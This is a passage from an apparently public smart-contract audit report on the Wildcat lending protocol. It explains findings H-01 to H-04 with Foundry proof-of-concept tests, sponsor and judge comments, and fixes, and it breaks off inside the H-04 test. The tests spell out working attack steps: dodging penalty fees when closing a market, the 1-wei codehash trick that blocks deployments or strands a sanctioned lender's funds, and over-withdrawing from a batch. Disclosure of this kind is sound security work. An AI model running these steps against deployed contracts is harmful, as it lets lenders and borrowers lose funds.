[H-01] Borrowers can escape from paying half of the penalty fees by closing the market, and those remaining penalty fees will be covered by the lender who withdraws last
Submitted byosmanozdemir1, also found byAymen0909,0xbepresent,QiuhaoLi,nonseodion,hash, 0xCiphky (1,2),TrungOre,ggg_ttt_hhh,rvierdiiev, andInAllHonesty
Lines of code
https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/libraries/FeeMath.sol#L168-L172
Vulnerability details
To explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let’s start with the fees.
Lenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.
The important part is how the penalty fees are calculated and I’ll be focusing on penalty fees at the moment. Every market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.
The most crucial part starts now. The penalty fee does not become0immediately after the delinquency is cured. The penalty fee is still being applied, even after the delinquency is cured, until the grace tracker counts down to zero.
An example from the protocolgitbook/borrowers section is:“Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that4days of penalty APR are paid.”
Here, you can find the code snippet of penalty fee calculation.
Now, let’s check how to close a market. Here is thecloseMarket()function:
file:WildcatMarket.sol142.functioncloseMarket()externalonlyControllernonReentrant{143.MarketStatememorystate=_getUpdatedState();144.state.annualInterestBips=0;145.state.isClosed=true;146.state.reserveRatioBips=0;147.if(_withdrawalData.unpaidBatches.length() >0) {148.revertCloseMarketWithUnpaidWithdrawals();149.}150.uint256currentlyHeld=totalAssets();151.@>uint256totalDebts=state.totalDebts();//@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining "state.timeDelinquent" to pay penalty fees.152.if(currentlyHeld<totalDebts) {153.// Transfer remaining debts from borrower154.@>asset.safeTransferFrom(borrower,address(this),totalDebts-currentlyHeld);//@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt155.}elseif(currentlyHeld>totalDebts) {156.// Transfer excess assets to borrower157.asset.safeTransfer(borrower,currentlyHeld-totalDebts);158.}159._writeState(state);160.emitMarketClosed(block.timestamp);161.}
https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarket.sol#L142C1-L161C4
While closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked thestate.timeDelinquent.
If thestate.timeDelinquent > grace periodwhen closing the market(which means the borrower still has more penalties to pay), the scale factor will keep increasing after every state update.
The borrower didn’t pay the remaining penalties when closing the market, but who will pay it?
Lenders will keep earning those penalty fees (the base rate will be0after closing, but the penalty fee will still accumulate)Lenders will start withdrawing their funds.All lenders except the last one will withdrawthe exact debt to the lender when closed + the penalty fee after closing.The last lender will not even be able to withdrawthe exact debt to the lender when closedbecause some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.
The borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.
The borrower had a cash flow problem after taking the debt.The market stayed delinquent for a long time.The borrower found some funds.The borrower wanted to close the high-interest debts right after finding some funds.Immediately paid everything and closed the market while the market was still delinquent.From the borrower’s perspective, they paid all of their debt while closing the market.But in reality, the borrower only paid half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower.
The protocol does not check if there are remaining penalties and doesn’t charge the borrower enough while closing the market.
I provided a coded PoC below that shows every step of the vulnerability.
Impact
The borrower will pay only half of the penalty while closing the market.The other half of the penalty will keep accumulating.One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.
Borrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (they know they won’t pay the half of it). Or the borrowers may not be aware of this, but the protocol doesn’t take the required penalty from them. They “unintentionally” do not pay the penalty, but the lender will have to cover it.
Coded PoC
You can use the protocol’s own test setup to prove this issue:
Copy the snippet below, and paste it into theWildcatMarket.t.soltest file.Run it withforge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv
// @audit Not pay the half, leave it to the last lenderfunctiontest_closeMarket_withoutPaying_HalfofThePenalty()external{// -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------// ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------// Alice and Bob deposit 50k each, borrower borrows 80%_authorizeLender(bob);vm.prank(alice);market.depositUpTo(50_000e18);vm.prank(bob);market.depositUpTo(50_000e18);vm.prank(borrower);market.borrow(80_000e18);// Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.vm.prank(alice);market.queueWithdrawal(10_000e18);vm.prank(bob);market.queueWithdrawal(10_000e18);// skip withdrawal batch durationskip(1days);market.executeWithdrawal(alice,86401);//86401 is the batch expiry. I hardoced it to make it shorter but it can also be found with _witdrawalDatamarket.executeWithdrawal(bob,86401);// Update the state. Market must be delinquent.market.updateState();MarketStatememorystate=market.previousState();assertTrue(state.isDelinquent);//----------------------------------------------CHAPTER TWO - ACTION------------------------------------------------------------------------------//----------------------------------CLOSE THE MARKET IMMEDIATELY AFTER PAYING DEBT----------------------------------------------------------------// Fast forward the time while delinquent to see the effect of delinquency penalty fees.skip(30days);// Give some funds to the borrower to pay the debt while closing.asset.mint(address(borrower),100_000e18);_approve(borrower,address(market),type(uint256).max);// We will close the market now. Save current state parameters just before closing.market.updateState();state=market.previousState();uint256normalizedBalanceOfAliceBeforeClosing=state.normalizeAmount(market.scaledBalanceOf(alice));uint256normalizedBalanceOfBobBeforeClosing=state.normalizeAmount(market.scaledBalanceOf(bob));uint256totalDebtBeforeClosing=state.totalDebts();uint256scaleFactorBeforeClosing=state.scaleFactor;console2.log("debt before closing: ",totalDebtBeforeClosing);console2.log("scale factor before closing: ",scaleFactorBeforeClosing);// Total debt before closing == normalized balance of Alice and Bob + unclaimed rewards + protocol fees.assertEq(totalDebtBeforeClosing,normalizedBalanceOfAliceBeforeClosing+normalizedBalanceOfBobBeforeClosing+state.normalizedUnclaimedWithdrawals+state.accruedProtocolFees);// Close the market.vm.prank(address(controller));market.closeMarket();// Total asset in the market must be equal to the total debts. All debts are covered (ACCORDING TO CURRENT DEBT)assertEq(state.totalDebts(),market.totalAssets());//-----------------------------------------------CHAPTER THREE - SHOW IT-------------------------------------------------------------------------------//---------------------------------DEBT WILL KEEP ACCUMULATING BECAUSE OF THE REMAINING PENALTY FEES--------------------------------------------------// Fast forward 30 more days.// Annual interest rate is updated to 0 when closing the market, but penalty fee keeps accumulating until the "state.timeDelinquent" goes toward 0.skip(30days);// Update the state.market.updateState();state=market.previousState();uint256totalDebtAfterClosing=state.totalDebts();uint256scaleFactorAfterClosing=state.scaleFactor;// Debt and scale factor kept accumulating. Total debt is higher than the paid amount by borrower.assertGt(totalDebtAfterClosing,totalDebtBeforeClosing);assertGt(scaleFactorAfterClosing,scaleFactorBeforeClosing);console2.log("debt after closing: ",totalDebtAfterClosing);console2.log("scale factor after closing: ",scaleFactorAfterClosing);// Who will pay this difference in debt? --> The last lender to withdraw from the market will cover it.// Previous lenders except the last one will keep earning those penalty fees, but the last one will have to pay those funds.// Alice withdraws all of her balance.uint256normalizedBalanceOfAliceAfterClosing=state.normalizeAmount(market.scaledBalanceOf(alice));vm.prank(alice);market.queueWithdrawal(normalizedBalanceOfAliceAfterClosing);// withdrawal batch durationskip(1days);market.executeWithdrawal(alice,5356801);// 5356801 is the emitted batch expiry. I hardoced it to make it shorter but it can also be found with _witdrawalData// After Alice's withdrawal, there won't be enough balance in the market to fully cover Bob.// Bob had to pay the penalty fee that the borrower didn't payuint256normalizedBalanceOfBobAfterClosing=state.normalizeAmount(market.scaledBalanceOf(bob));assertGt(normalizedBalanceOfBobAfterClosing,market.totalAssets());console2.log("total assets left: ",market.totalAssets());console2.log("normalized amount bob should get: ",normalizedBalanceOfBobAfterClosing);}
Below, you can find the test results:
Running1testfortest/market/WildcatMarket.t.sol:WildcatMarketTest[PASS]test_closeMarket_withoutPaying_HalfofThePenalty() (gas:714390)Logs:debt before closing:  81427089816031080808713scale factor before closing:  1016988862478541592821945607debt after closing:  82095794821496423225911scale factor after closing:  1025347675046858373036920502total assets left:  40413182814156745887236normalized amount bob should get:  41013907001874334921477Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.41msRan 1 test suites: 1 tests passed, 0 failed, 0 skipped (1totaltests)
Tools Used
Foundry
Recommended Mitigation Steps
I think there might be two different solutions: the easier one and the other.
The easy solution is just not to allow the borrower to close the market until all the penalty fees are accumulated. This can easily be done by checkingstate.timeDelinquentin thecloseMarket()function.
That one is simple, but I don’t think it is fair for the borrower, as they will have to pay the base rate as well, for that additional amount of time. Maybe the borrower will be inclined to pay thecurrent debt + future penaltiesand close the market as soon as possible.
That’s why I think closing the market can still be allowed, even if there are penalties to accumulate. However, the problem is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.
Therefore, I believe a buffer amount should be added. If the borrowers want to close the market, they should paycurrent debt + expected future penalties + buffer amount, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.
Assessed type
Context
laurenceday (Wildcat) commented:
We decided to permit borrowers to close markets if delinquent and just zero outstate.timeDelinquent, returning everything outstanding at that moment and ending things there. It’s preferable from the POV of the lender to just be able to access their notional and interest ASAP, rather than wait for the timer to run back down to within the grace period. There’s no alternative ‘good’ solution to this that isn’t particularly fiddly given the way in which interest compounds.The suggested solution would require that people waited until the market was out of delinquency before the scale factor caught up when only the penalty rate applied, so they could redeem for the extra amount due to them: this could be alongtime if the situation leading up to a market closure after going delinquent is a protracted one.Mitigatedhere.
laurenceday (Wildcat) confirmed

[H-02]codehashcheck in factory contracts does not account for non-empty addresses
Submitted byMiloTruck, also found by Robert (1,2,3) and0xDING99YA
InWildcatMarketControllerFactory.sol, registered borrowers can calldeployController()to deploy aWildcatMarketControllercontract for themselves.
The function checks if thecodehashof the controller address isbytes32(0)to determine if the controller has already been deployed:
WildcatMarketControllerFactory.sol#L287-L296
// Salt is borrower addressbytes32salt=bytes32(uint256(uint160(msg.sender)));controller=LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix,salt,controllerInitCodeHash);if(controller.codehash!=bytes32(0)) {// auditor: This checkrevertControllerAlreadyDeployed();}
This same check is also used indeployMarket(), which is called by borrowers to deploy markets:
WildcatMarketController.sol#L349-L353
bytes32salt=_deriveSalt(asset,namePrefix,symbolPrefix);market=LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix,salt,marketInitCodeHash);if(market.codehash!=bytes32(0)) {revertMarketAlreadyDeployed();}
This check also exists increateEscrow(), which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:
WildcatSanctionsSentinel.sol#L104-L106
escrowContract=getEscrowAddress(borrower,account,asset);if(escrowContract.codehash!=bytes32(0))returnescrowContract;
However, this<address>.codehash != bytes32(0)check is insufficient to determine if an address has existing code. According toEIP-1052, addresses without code only return a0x0codehash when they areempty:
In case the account does not exist or is empty (as defined byEIP-161)0is pushed to the stack.In case the account does not have code the keccak256 hash of empty data (i.e.c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470) is pushed to the stack.
As seen from above, addresses without code can also returnkeccak256("")as itscodehashif it is non-empty.EIP-161states that an address must have a zero ETH balance for it to be empty:
An account is consideredemptywhen it hasno codeandzero nonceandzero balance.
As such, if anyone transfers 1 wei to an address,.codehashwill returnkeccak256("")instead ofbytes32(0), making the checks shown above pass incorrectly.
Since all contract deployments in the protocol useCREATE2, a malicious attacker can harm users by doing the following:
For controller deployments:Attacker callscomputeControllerAddress()to compute the controller address for a borrower.Attacker transfers 1 wei to it, causing.codehashto become non-zero.WhendeployController()is called by the borrower, the check passes, causing the function to revert.For market deployments:Attacker callscomputeMarketAddress()with arguments such that the deployment salt is the same.Attacker transfers 1 wei to the resulting market address, causing.codehashto become non-zero.WhendeployMarket()is called by the borrower, the function reverts.For escrow deployments:Attacker callsgetEscrowAddress()with theborrower, sanctionedlenderand market/asset address to compute the resulting escrow address.Attacker transfers 1 wei to the escrow address, causing.codehashto become non-zero.When eithernukeFromOrbit()orexecuteWithdrawal()is called,createEscrow()simply returns the escrow address instead of deploying an escrow contract.The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.
Note that for controller deployments, since the salt is fixed to theborroweraddress and cannot be varied, the DOS fordeployController()is permanent. This effectively locks theborrowerout of all protocol functionality forever since they can never deploy a market controller for themselves.
Impact
An attacker can do the following at the cost of 1 wei and some gas:
Permanently lock a registered borrower out of all borrowing-related functionality by forcingdeployController()to always revert for their address.Grief market deployments by causingdeployMarket()to always revert for a givenborrower,lenderandmarket.Cause a sanctioned lender to lose all their funds in a market whennukeFromOrbit()orexecuteWithdrawal()is called for their address.
Proof of Concept
The code below contains three tests:
test_CanDOSControllerDeployment()demonstrates how an attacker can forcedeployController()to revert permanently for a borrower by transferring 1 wei to the computed controller address.test_CanDOSMarketDeployment()demonstrates howdeployMarket()can be forced to revert with the same attack.test_CanSkipEscrowDeployment()shows how an attacker can skip the escrow deployment for a lender if they get blocked, causing their market tokens to be unrecoverable.
// SPDX-License-Identifier: MITpragmasolidity>=0.8.20;import'src/WildcatSanctionsSentinel.sol';import'src/WildcatArchController.sol';import'src/WildcatMarketControllerFactory.sol';import'src/interfaces/IWildcatMarketControllerEventsAndErrors.sol';import'forge-std/Test.sol';import'test/shared/TestConstants.sol';import'test/helpers/MockERC20.sol';contractCodeHashTestisTest,IWildcatMarketControllerEventsAndErrors{// Wildcat contractsaddressMOCK_CHAINALYSIS_ADDRESS=address(0x1337);WildcatSanctionsSentinelsentinel;WildcatArchControllerarchController;WildcatMarketControllerFactorycontrollerFactory;// Test contractsMockERC20asset;// UsersaddressAIKEN;addressDUEET;functionsetUp()external{// Deploy Wildcat contractsarchController=newWildcatArchController();sentinel=newWildcatSanctionsSentinel(address(archController),MOCK_CHAINALYSIS_ADDRESS);MarketParameterConstraintsmemoryconstraints=MarketParameterConstraints({minimumDelinquencyGracePeriod:MinimumDelinquencyGracePeriod,maximumDelinquencyGracePeriod:MaximumDelinquencyGracePeriod,minimumReserveRatioBips:MinimumReserveRatioBips,maximumReserveRatioBips:MaximumReserveRatioBips,minimumDelinquencyFeeBips:MinimumDelinquencyFeeBips,maximumDelinquencyFeeBips:MaximumDelinquencyFeeBips,minimumWithdrawalBatchDuration:MinimumWithdrawalBatchDuration,maximumWithdrawalBatchDuration:MaximumWithdrawalBatchDuration,minimumAnnualInterestBips:MinimumAnnualInterestBips,maximumAnnualInterestBips:MaximumAnnualInterestBips});controllerFactory=newWildcatMarketControllerFactory(address(archController),address(sentinel),constraints);// Register controllerFactory in archControllerarchController.registerControllerFactory(address(controllerFactory));// Deploy asset tokenasset=newMockERC20();// Setup Aiken and register him as borrowerAIKEN=makeAddr("AIKEN");archController.registerBorrower(AIKEN);// Setup Dueet and give him some asset tokenDUEET=makeAddr("DUEET");asset.mint(DUEET,1000e18);}functiontest_CanDOSControllerDeployment()public{// Dueet front-runs Aiken and transfers 1 wei to Aiken's controller addressaddresscontrollerAddress=controllerFactory.computeControllerAddress(AIKEN);payable(controllerAddress).transfer(1);// Codehash of Aiken's controller address is now keccak256("")assertEq(controllerAddress.codehash,keccak256(""));// Aiken calls deployController(), but it reverts due to non-zero codehashvm.prank(AIKEN);vm.expectRevert(WildcatMarketControllerFactory.ControllerAlreadyDeployed.selector);controllerFactory.deployController();}functiontest_CanDOSMarketDeployment()public{// Deploy WildcatMarketController for Aiken(WildcatMarketControllercontroller, ) =_deployControllerAndMarket(AIKEN,address(0),"_","_");// Dueet front-runs Aiken and transfers 1 wei to market addressstringmemorynamePrefix="Market Token";stringmemorysymbolPrefix="MKT";addressmarketAddress=controller.computeMarketAddress(address(asset),namePrefix,symbolPrefix);payable(marketAddress).transfer(1);// Codehash of market address is now keccak256("")assertEq(marketAddress.codehash,keccak256(""));// Aiken calls deployMarket(), but it reverts due to non-zero codehashvm.prank(AIKEN);vm.expectRevert(MarketAlreadyDeployed.selector);controller.deployMarket(address(asset),namePrefix,symbolPrefix,type(uint128).max,MaximumAnnualInterestBips,MaximumDelinquencyFeeBips,MaximumWithdrawalBatchDuration,MaximumReserveRatioBips,MaximumDelinquencyGracePeriod);}functiontest_CanSkipEscrowDeployment()public{// Deploy WildcatMarketController and WildcatMarket for Aiken(WildcatMarketControllercontroller,WildcatMarketmarket) =_deployControllerAndMarket(AIKEN,address(asset),"Market Token","MKT");// Register Dueet as lenderaddress[]memoryarr=newaddress[](1);arr[0] =DUEET;vm.prank(AIKEN);controller.authorizeLenders(arr);// Dueet becomes a lender in the marketvm.startPrank(DUEET);asset.approve(address(market),1000e18);market.depositUpTo(1000e18);vm.stopPrank();// Dueet becomes sanctionedvm.mockCall(MOCK_CHAINALYSIS_ADDRESS,abi.encodeCall(IChainalysisSanctionsList.isSanctioned, (DUEET)),abi.encode(true));// Attacker transfers 1 wei to Dueet's escrow address// Note: Borrower and lender addresses are swapped due to a separate bugaddressescrowAddress=sentinel.getEscrowAddress(DUEET,AIKEN,address(market));payable(escrowAddress).transfer(1);// Codehash of market address is now keccak256("")assertEq(escrowAddress.codehash,keccak256(""));// Dueet gets blocked in marketmarket.nukeFromOrbit(DUEET);// Dueet's MKT tokens are transferred to his escrow addressassertEq(market.balanceOf(escrowAddress),1000e18);// However, the escrow contract was not deployedassertEq(escrowAddress.code.length,0);}function_deployControllerAndMarket(addressuser,address_asset,stringmemorynamePrefix,stringmemorysymbolPrefix)internalreturns(WildcatMarketController,WildcatMarket){vm.prank(user);(addresscontroller,addressmarket) =controllerFactory.deployControllerAndMarket(namePrefix,symbolPrefix,_asset,type(uint128).max,MaximumAnnualInterestBips,MaximumDelinquencyFeeBips,MaximumWithdrawalBatchDuration,MaximumReserveRatioBips,MaximumDelinquencyGracePeriod);return(WildcatMarketController(controller),WildcatMarket(market));}}
Recommended Mitigation
Consider checking if the codehash of an address is notkeccak256("")as well:
WildcatMarketControllerFactory.sol#L294-L296
-   if (controller.codehash != bytes32(0)) {+   if (controller.codehash != bytes32(0) && controller.codehash != keccak256("")) {revert ControllerAlreadyDeployed();}
WildcatMarketController.sol#L351-L353
-   if (market.codehash != bytes32(0)) {+   if (market.codehash != bytes32(0) && market.codehash != keccak256("")) {revert MarketAlreadyDeployed();}
WildcatSanctionsSentinel.sol#L106
-   if (escrowContract.codehash != bytes32(0)) return escrowContract;+   if (escrowContract.codehash != bytes32(0)) && escrowContract.codehash != keccak256("") return escrowContract;
Alternatively, use<address>.code.length != 0to check if an address has code instead.
Assessed type
Invalid Validation
laurenceday (Wildcat) commented:
Fix for this is easier than suggested - just change fromx.codehash != bytes32(0)tox.code.length != 0.Mitigatedhereandhere.I’d emphasise here, however, that this is only a High Risk finding in the escrow situation - the others are grieving attacks that cause nothing to be “lost”. Still a valuable finding, mind.
laurenceday (Wildcat) confirmed

[H-03] Borrower has no way to updatemaxTotalSupplyofmarketor close market.
Submitted by0xpiken, also found byAymen0909,MiloTruck,Fulum,0xCiphky,max10afternoon,tallo,Drynooo,cartlex_,HALITUS, gumgumzum (1,2),CaeraDenoir,serial-coder,stackachu,0xkazim,josephdara,Toshii, DeFiHackLabs (1,2), SpicyMeatball (1,2), ZdravkoHr (1,2),nirlin,radev_sw,TuringConsulting,nonseodion,Yanchuan, hash (1,2),erictee,jasonxiale,_nd_koo,0xhegel,gizzy,sl1, QiuhaoLi (1,2),trachev,smiling_heretic,crunch,LokiThe5th,said,lanrebayode77,circlelooper,SovaSlava,osmanozdemir1,Mike_Bello90,TrungOre,Silvermist, Vagner (1,2),kodyvim,deth, ke1caM (1,2),Jiamin, 0xStalin (1,2),almurhasan,peter,audityourcontracts,ggg_ttt_hhh,AM, Eigenvectors (1,2),3docSec,Juntao, marqymarq10 (1,2), 0xComfyCat (1,2), rvierdiiev (1,2),ayden,squeaky_cactus,cu5t0mpeo,zaevlad,HChang26, and T1MOH (1,2)
Without the ability to updatemaxTotalSupply,borrowerhas no way to raise more assets in a specific market. Even worse,borrowerhas to pay extra interest for unused assets all the time becauseborrowerhas no way to reduce the max total supply of the market.
Similarly,borrowerhas to pay extra interest to the no-longer-used market all the time because there is no way to close it.
Proof of Concept
There are access controls on functionssetMaxTotalSupply()andcloseMarket(), and onlyWildcatMarketControlleris allowed to access them; however, there is not a function inWildcatMarketControllerallowing theborrowerto access them.
Recommended Mitigation Steps
AddsetMaxTotalSupply()andcloseMarket()inWildcatMarketControllerto allow theborroweraccess these functions:
functionsetMaxTotalSupply(addressmarket,uint256_maxTotalSupply)externalonlyBorrower{WildcatMarket(market).setMaxTotalSupply(_maxTotalSupply);}functioncloseMarket(addressmarket)externalonlyBorrower{WildcatMarket(market).closeMarket();}
Assessed type
Access Control
laurenceday (Wildcat) commented:
Mitigatedhereandhere.Lodging a protest against the High Risk decision, however:Markets could stilleffectivelybe closed by all lenders redeeming their market tokens; the borrower handling these repayments ad hoc and the borrower removing all lenders from the appropriate controller to prevent future deposits. No funds are at risk here.The inability to increase or decrease the capacity from the controller - which can lead to more interest accruing to a lender that refuses to withdraw - is not a matter of funds being “lost” but rather a grieving.In either case, assets arenotat direct riskwhile in the market: the definition of High Risk as given by the label is “assets can be stolen/lost/compromised directly”.This does not apply here. It’s certainly a Medium; however, and a valuable finding in and of itself.
0xTheC0der (judge) commented:
I partially agree with the sponsor. However, if the protocol was deployed with this bug, it would lack 2 core functionalities.A protocol being fully functional as intended, which is crucial to attract and keep customers/users with funds in the long term, can be considered a valuable asset itself.Although Medium severity is predestined for this category of findings which impede the function of a protocol, High severity seems justified given the impact.The following might further clarify my reasoning:Please also consider that not all findings that lead to lost or stolen funds will strictly yield a High severity finding, since it depends on the amount of funds at risk.In contrast, not every impeded functionality will only yield Medium severity.
laurenceday (Wildcat) confirmed and commented:
Fair enough - not going to throw toys out of the pram over semantics. Appreciate the feedback!

[H-04] WhenwithdrawalBatchDurationis set to zero lenders can withdraw more then allocated to a batch
Submitted by0xCiphky
Lines of code
https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketWithdrawals.sol#L137https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketWithdrawals.sol#L77
Vulnerability details
The Wildcat protocol utilizes a withdrawal cycle where lenders callqueueWithdrawalswhich then goes through a set amount of time (withdrawal duration period) before a withdrawal can be executed (if the protocol has enough funds to cover the withdrawal). Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.
ThewithdrawalBatchDurationcan be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch’s paid assets.
A lender callsqueueWithdrawalfirst to initiate the withdrawal; this will place it in a batch respective to its expiry:
functionqueueWithdrawal(uint256amount)externalnonReentrant{MarketStatememorystate=_getUpdatedState();...// If there is no pending withdrawal batch, create a new one.if(state.pendingWithdrawalExpiry==0) {state.pendingWithdrawalExpiry=uint32(block.timestamp+withdrawalBatchDuration);emitWithdrawalBatchCreated(state.pendingWithdrawalExpiry);}// Cache batch expiry on the stack for gas savings.uint32expiry=state.pendingWithdrawalExpiry;WithdrawalBatchmemorybatch=_withdrawalData.batches[expiry];// Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state._withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount+=scaledAmount;batch.scaledTotalAmount+=scaledAmount;state.scaledPendingWithdrawals+=scaledAmount;emitWithdrawalQueued(expiry,msg.sender,scaledAmount);// Burn as much of the withdrawal batch as possible with available liquidity.uint256availableLiquidity=batch.availableLiquidityForPendingBatch(state,totalAssets());if(availableLiquidity>0) {_applyWithdrawalBatchPayment(batch,state,expiry,availableLiquidity);}// Update stored batch data_withdrawalData.batches[expiry] =batch;// Update stored state_writeState(state);}
Now once thewithdrawalBatchDurationhas passed, a lender can callexecuteWithdrawalto finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.
functionexecuteWithdrawal(addressaccountAddress,uint32expiry)externalnonReentrantreturns(uint256) {if(expiry>block.timestamp) {revertWithdrawalBatchNotExpired();}MarketStatememorystate=_getUpdatedState();WithdrawalBatchmemorybatch=_withdrawalData.batches[expiry];AccountWithdrawalStatusstoragestatus=_withdrawalData.accountStatuses[expiry][accountAddress];uint128newTotalWithdrawn=uint128(MathUtils.mulDiv(batch.normalizedAmountPaid,status.scaledAmount,batch.scaledTotalAmount));uint128normalizedAmountWithdrawn=newTotalWithdrawn-status.normalizedAmountWithdrawn;status.normalizedAmountWithdrawn=newTotalWithdrawn;state.normalizedUnclaimedWithdrawals-=normalizedAmountWithdrawn;...// Update stored state_writeState(state);returnnormalizedAmountWithdrawn;}
Let’s look at how this percentage is determined: thenewTotalWithdrawnfunction determines a lender’s available withdrawal amount by multiplying thenormalizedAmountPaidwith thescaledAmountand dividing the result by the batch’sscaledTotalAmount. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on theirscaledAmount.
uint128newTotalWithdrawn=uint128(MathUtils.mulDiv(batch.normalizedAmountPaid,status.scaledAmount,batch.scaledTotalAmount));
This works fine whenwithdrawalBatchDurationis set over zero, as the batch values (exceptnormalizedAmountPaid) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more thannormalizedAmountPaidin that batch, potentially violating protocol invariants.
Consider the following scenario:
There is only 5 tokens available to burn.
Lender A callsqueueWithdrawalwith 5 andexecuteWithdrawalinstantly.
newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmountnewTotalWithdrawn = 5 * 5 = 25 / 5 = 5
Lender A was able to fully withdraw.
Lender B comes along and callsqueueWithdrawalwith 5 andexecuteWithdrawalinstantly in the same block. This will add to the same batch as lender A as it is the same expiry.
Now let’s look atnewTotalWithdrawnfor Lender B:
newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmountnewTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5
Lets see what the batch looks like now:
Lender A was able to withdraw 5 tokens in the batch.Lender B was able to withdraw 2.5 tokens in the batch.Thebatch.normalizedAmountPaidis 5, meaning the Lenders’ withdrawal amount surpassed the batch’s current limit.
Impact
This will break the following invariant in the protocol:
“Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch’s paid assets.”
It will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch’snormalizedAmountPaidnumber shows that it should be able to.
Proof Of Concept
For the following test, make sure you use the following parameters inExpectedStateTracker:
MarketParametersinternalparameters=MarketParameters({asset:address(0),namePrefix:"Wildcat ",symbolPrefix:"WC",borrower:borrower,controller:address(0),feeRecipient:address(0),sentinel:address(sanctionsSentinel),maxTotalSupply:uint128(DefaultMaximumSupply),protocolFeeBips:0,annualInterestBips:0,delinquencyFeeBips:DefaultDelinquencyFee,withdrawalBatchDuration:0,reserveRatioBips:DefaultReserveRatio,delinquencyGracePeriod:DefaultGracePeriod});
functiontest_ZeroWithdrawalDuration()externalasAccount(address(controller)) {assertEq(market.withdrawalBatchDuration(),0);// alice deposit_deposit(alice,2e18);// bob deposit_deposit(bob,1e18);// borrow 33% of deposits_borrow(1e18);// alice withdraw requeststartPrank(alice);market.queueWithdrawal(1e18);stopPrank();// fast forward 1 daysfastForward(1days);// alice withdraw requeststartPrank(alice);market.queueWithdrawal(1e18);stopPrank();// lets look at the withdrawal batchassertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid,1e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount,1e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned,1e18);// check amount alice has withdrawn so far (should be zero)assertEq(market.getAccountWithdrawalStatus(address(alice),uint32(block.timestamp)).normalizedAmountWithdrawn,0);// alice withdrawstartPrank(alice);market.executeWithdrawal(address(alice),uint32(block.timestamp));stopPrank();// check amount alice has withdrawn so far (should be 1e18)assertEq(market.getAccountWithdrawalStatus(address(alice),uint32(block.timestamp)).normalizedAmountWithdrawn,1e18);// bob withdraw request in same batchstartPrank(bob);market.queueWithdrawal(1e18);stopPrank();// lets look at the withdrawal batch nowassertEq(market.getWithdrawalBatch(uint32(block.timestamp)).normalizedAmountPaid,1e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledTotalAmount,2e18);assertEq(market.getWithdrawalBatch(uint32(block.timestamp)).scaledAmountBurned,1e18);// check amount bob has withdrawn so far (should be zero)assertEq(market.getAccountWithdrawalStatus(address(bob),uint32(block.timestamp)).normalizedAmountWithdrawn,0);// bob withdrawstartPrank(bob);market.executeWithdrawal(address(bob),uint32(block.timestamp));stopPrank();// check amount bob has withdrawn so far (should be 5e17)assertEq(market.getAccountWithdrawalStatus(address(bob),uint32(block.timestamp)).normalizedAmountWithdrawn,5e17);// lets look at the withdrawal batch 